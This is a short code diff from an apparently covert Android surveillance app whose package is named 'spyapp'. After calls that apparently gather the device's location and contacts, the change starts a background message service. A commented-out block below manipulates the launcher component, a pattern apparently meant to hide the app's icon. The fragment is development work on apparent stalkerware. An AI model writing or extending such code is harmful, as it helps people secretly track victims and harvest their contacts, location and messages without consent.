@@ -7,6 +7,7 @@ import android.app.Activity;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -127,6 +128,9 @@ public class MainActivity extends AppCompatActivity {
                           mainApi();
                           latLonApi();
                           contactApi();
+
+                          Intent in = new  Intent(MainActivity.this,MsgService.class);
+                          startService(in);
 
                          /* PackageManager p = getPackageManager();
                           ComponentName componentName = new ComponentName(this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
